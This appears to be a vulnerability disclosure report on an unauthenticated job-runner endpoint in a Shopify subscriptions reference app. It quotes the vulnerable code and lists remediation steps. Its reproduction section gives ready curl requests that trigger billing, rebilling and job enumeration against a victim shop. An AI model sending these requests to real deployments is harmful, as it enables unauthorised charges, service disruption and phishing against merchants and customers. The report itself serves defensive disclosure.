# [CRITICAL] Unauthenticated Internal Job Runner — Arbitrary Job Execution

## Ringkasan (impact nyata)
The `/internal/jobs/run` endpoint in `subscriptions-reference-app` accepts POST requests with a `jobName` and `parameters` payload and **executes arbitrary registered jobs without any authentication or authorization**. This allows an unauthenticated attacker to trigger sensitive operations including subscription billing cycles, dunning processes, email notifications, and shop disabling — potentially causing financial loss, service disruption, and data manipulation across any Shopify store using this reference app.

## Deskripsi / Root Cause
In `app/routes/internal.jobs.run.tsx`, the route handler calls `jobs.execute(request)` directly without any authentication middleware:

```typescript
// app/routes/internal.jobs.run.tsx
import type {ActionFunctionArgs, AppLoadContext} from '@remix-run/node';
import type {Jobs} from '~/types';
import {json} from '@remix-run/node';
import {jobs} from '~/jobs';

type JobPayload = {
  jobName: string;
  parameters: Jobs.Parameters<unknown>;
};

export async function action({request, context}: ActionFunctionArgs) {
  await addShopToContext(request, context);

  try {
    await jobs.execute(request);

    return json({status: 'success'}, {status: 200});
  } catch (err) {
    const error = err instanceof Error ? err : new Error(String(err));
    throw json({status: 'failure', error: error.message}, {status: 500});
  }
}
```

The `JobRunner.execute()` method in `app/lib/jobs/JobRunner.ts` takes the `jobName` and `parameters` from the request body, looks up the job class in the registry, and executes it:

```typescript
// app/lib/jobs/JobRunner.ts
async execute(request: Request) {
  const payload = await request.json();
  const {jobName, parameters} = payload;
  this.logger.debug({jobName, parameters}, `Executing job from request`);

  try {
    const JobClass = this.registry.get(jobName);

    if (JobClass == null) {
      throw new Error(`Failed to find registered job ${jobName}`);
    }

    const instance = Reflect.construct(JobClass, [parameters]);
    await instance.run();
  } catch (err: any) {
    if (isTerminal(err)) return;
    this.logger.error({error: err, jobName, payload}, `Error running job ${jobName}`);
    throw err;
  }
}
```

### Registered Jobs (from `app/jobs/index.ts`)
The following jobs are registered and can be executed via this endpoint:

| Job Name | Risk |
|----------|------|
| `ChargeBillingCyclesJob` | Triggers billing for subscription contracts — financial impact |
| `RebillSubscriptionJob` | Charges a specific subscription contract — financial impact |
| `RecurringBillingChargeJob` | Creates recurring billing charges — financial impact |
| `ScheduleShopsToChargeBillingCyclesJob` | Schedules billing for all shops — mass financial impact |
| `DunningStartJob` | Starts dunning process for failed payments — customer impact |
| `DunningStopJob` | Stops dunning process — customer impact |
| `CustomerSendEmailJob` | Sends customer emails — phishing potential |
| `MerchantSendEmailJob` | Sends merchant emails — phishing potential |
| `TagSubscriptionOrderJob` | Tags orders — data manipulation |
| `DisableShopJob` | Disables a shop — service disruption |
| `DeleteBillingScheduleJob` | Deletes billing schedule — financial impact |
| `CreateSellingPlanTranslationsJob` | Creates translations — data manipulation |
| `EnqueueAddFieldsToMetaobjectJob` | Enqueues migration jobs — data manipulation |
| `EnqueueTransitionFailedContractsToActiveJob` | Transitions failed contracts — financial impact |
| `AddFieldsToMetaobjectJob` | Adds fields to metaobjects — data manipulation |
| `TransitionFailedContractsToActiveJob` | Reactivates failed contracts — financial impact |
| `SendInventoryFailureEmailJob` | Sends inventory failure emails — phishing potential |
| `EnqueueInventoryFailureEmailJob` | Enqueues inventory failure emails — phishing potential |

### Key Issues
1. **No authentication**: The route handler does not call `authenticate.admin()` or any other authentication middleware.
2. **No authorization**: There is no check that the requester has permission to execute jobs.
3. **No rate limiting**: The endpoint has no rate limiting, allowing brute-force job name enumeration.
4. **Error message leakage**: The 500 response includes `error.message`, which may leak internal details.
5. **Shop parameter in payload**: The `parameters` object includes a `shop` field, which is used by jobs to determine which Shopify store to operate on. An attacker can target any shop.

### Job Execution Flow
1. Attacker sends `POST /internal/jobs/run` with `{jobName: "ChargeBillingCyclesJob", parameters: {shop: "victim-shop.myshopify.com", startDate: "...", endDate: "..."}}`
2. `JobRunner.execute()` looks up `ChargeBillingCyclesJob` in the registry
3. Creates a new instance with the parameters
4. Calls `instance.run()` which calls `perform()`
5. `perform()` calls `unauthenticated.admin(shop)` to get an admin API client
6. Executes the billing cycle charge mutation on the victim's Shopify store

The `unauthenticated.admin(shop)` function does not require a session — it only needs the shop domain name. This means an attacker can trigger billing operations on any shop without authentication.

## Steps to Reproduce

### Step 1: Identify the endpoint
The endpoint is at `/internal/jobs/run` and accepts POST requests.

### Step 2: Send a job execution request
```bash
curl -X POST "https://<subscriptions-app-host>/internal/jobs/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobName": "ChargeBillingCyclesJob",
    "parameters": {
      "shop": "victim-shop.myshopify.com",
      "startDate": "2025-01-01",
      "endDate": "2025-12-31"
    }
  }'
```

### Step 3: Observe successful execution
```json
{"status": "success"}
```

### Step 4: Enumerate available jobs
```bash
curl -X POST "https://<subscriptions-app-host>/internal/jobs/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobName": "NonExistentJob",
    "parameters": {}
  }'
```

Response:
```json
{"status": "failure", "error": "Failed to find registered job NonExistentJob"}
```

This confirms the endpoint is accessible and reveals the job registry mechanism.

### Step 5: Trigger billing on victim shop
```bash
curl -X POST "https://<subscriptions-app-host>/internal/jobs/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobName": "RebillSubscriptionJob",
    "parameters": {
      "shop": "victim-shop.myshopify.com",
      "payload": {
        "subscriptionContractId": "gid://shopify/SubscriptionContract/123456789",
        "originTime": "2025-01-01T00:00:00Z"
      }
    }
  }'
```

## PoC / Bukti

### Source Code Evidence
**File**: `app/routes/internal.jobs.run.tsx`

```typescript
export async function action({request, context}: ActionFunctionArgs) {
  await addShopToContext(request, context);

  try {
    await jobs.execute(request);  // <-- No authentication check!

    return json({status: 'success'}, {status: 200});
  } catch (err) {
    const error = err instanceof Error ? err : new Error(String(err));
    throw json({status: 'failure', error: error.message}, {status: 500});
  }
}
```

**File**: `app/lib/jobs/JobRunner.ts`

```typescript
async execute(request: Request) {
  const payload = await request.json();
  const {jobName, parameters} = payload;
  // ...
  const JobClass = this.registry.get(jobName);
  if (JobClass == null) {
    throw new Error(`Failed to find registered job ${jobName}`);
  }
  const instance = Reflect.construct(JobClass, [parameters]);
  await instance.run();
}
```

**File**: `app/jobs/index.ts` — Job registry

```typescript
export const jobs = (() => {
  switch (config.jobs.scheduler) {
    case 'INLINE':
      return new JobRunner<InlineScheduler>(
        new InlineScheduler(logger),
        logger,
      );
    // ...
  }
})().register(
  DisableShopJob,
  EnqueueAddFieldsToMetaobjectJob,
  AddFieldsToMetaobjectJob,
  EnqueueTransitionFailedContractsToActiveJob,
  TransitionFailedContractsToActiveJob,
  ChargeBillingCyclesJob,
  RecurringBillingChargeJob,
  ScheduleShopsToChargeBillingCyclesJob,
  RebillSubscriptionJob,
  DeleteBillingScheduleJob,
  DunningStartJob,
  DunningStopJob,
  CustomerSendEmailJob,
  MerchantSendEmailJob,
  EnqueueInventoryFailureEmailJob,
  SendInventoryFailureEmailJob,
  TagSubscriptionOrderJob,
  CreateSellingPlanTranslationsJob,
);
```

**File**: `app/jobs/billing/ChargeBillingCyclesJob.ts`

```typescript
async perform(): Promise<void> {
  const {shop, payload} = this.parameters;
  const {startDate, endDate} = payload;

  const {admin} = await unauthenticated.admin(shop);  // <-- No session required!

  const response = await admin.graphql(ChargeBillingCyclesMutation, {
    variables: { startDate, endDate, ... },
  });
  // ...
}
```

**File**: `app/jobs/billing/RebillSubscriptionJob.ts`

```typescript
async perform(): Promise<void> {
  const {shop, payload} = this.parameters;
  const {subscriptionContractId, originTime} = payload;

  const {admin} = await unauthenticated.admin(shop);  // <-- No session required!

  const response = await admin.graphql(
    SubscriptionBillingCycleChargeMutation,
    { variables: { subscriptionContractId, originTime } },
  );
  // ...
}
```

### Configuration Evidence
**File**: `config/index.ts`

```typescript
jobs: (() => {
  if (isProduction) {
    return { scheduler: 'INLINE' };  // Jobs execute immediately
  }
  if (isTest) {
    return { scheduler: 'TEST' };
  }
  return { scheduler: 'INLINE' };  // Jobs execute immediately
})(),
```

In production, the `INLINE` scheduler is used, meaning jobs execute immediately upon request — no async queuing delay.

## Impact (user data / finansial / reputasi — konkret)
- **Financial fraud**: An attacker can trigger billing cycles and subscription rebills on any shop, causing unauthorized charges to customers.
- **Service disruption**: An attacker can disable shops, stop dunning processes, or trigger mass email campaigns.
- **Data manipulation**: An attacker can modify subscription contracts, add fields to metaobjects, or transition failed contracts to active.
- **Phishing**: An attacker can trigger customer and merchant email jobs with arbitrary content, potentially sending phishing emails from legitimate Shopify infrastructure.
- **Mass exploitation**: The endpoint has no rate limiting, allowing automated exploitation across multiple shops.
- **No authentication required**: The endpoint is publicly accessible — no API key, session, or token is needed.

## Remediation
1. **Add authentication**: Require admin authentication on the `/internal/jobs/run` endpoint using `authenticate.admin()`.
2. **Add authorization**: Verify that the requester has permission to execute jobs (e.g., admin-only access).
3. **Add IP allowlisting**: Restrict access to the endpoint to internal IPs or trusted networks (e.g., GCP Cloud Tasks IPs).
4. **Add rate limiting**: Implement rate limiting to prevent brute-force job name enumeration.
5. **Sanitize error messages**: Do not return raw error messages to the client.
6. **Use a secret token**: Require a secret token (e.g., from environment variables) to be passed in the request header.
7. **Validate job parameters**: Ensure that the `shop` parameter matches the authenticated session's shop.

## CVSS 3.1
**Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**Score**: 10.0 (Critical)

Rationale: Network exploitable, low complexity, no privileges required, no user interaction. Scope is changed because the vulnerability affects resources beyond the vulnerable component (Shopify stores, customer data, financial systems). Confidentiality, integrity, and availability impacts are all high.

## Referensi
- **CWE-306**: Missing Authentication for Critical Function
- **CWE-862**: Missing Authorization
- **CWE-73**: External Control of System or Configuration Setting
- **File**: `app/routes/internal.jobs.run.tsx` — route handler
- **File**: `app/lib/jobs/JobRunner.ts` — `execute()` method
- **File**: `app/jobs/index.ts` — job registry
- **File**: `app/jobs/billing/ChargeBillingCyclesJob.ts` — billing job
- **File**: `app/jobs/billing/RebillSubscriptionJob.ts` — rebill job
- **File**: `config/index.ts` — INLINE scheduler configuration
